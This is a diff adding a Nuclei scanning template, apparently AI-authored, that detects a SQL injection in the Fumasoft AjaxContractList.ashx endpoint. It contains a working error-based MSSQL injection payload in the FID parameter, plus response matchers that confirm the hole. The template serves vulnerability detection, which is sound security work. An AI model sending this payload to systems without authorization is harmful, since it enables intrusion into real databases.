@@ -1,0 +1,36 @@
+id: fumasoft-ajaxcontractlist-sqli
+info:
+  name: Fumasoft AjaxContractList SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Fumasoft AjaxContractList.ashx endpoint.
+
+variables:
+  t1: "{{rand_int(1000,100000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /m/Dingding/Ajax/AjaxContractList.ashx?method=getTitle&type=F&FID=1'and+1<sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "FumaCRM"
+          - ".AjaxContractList"
+        part: body
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+        part: body
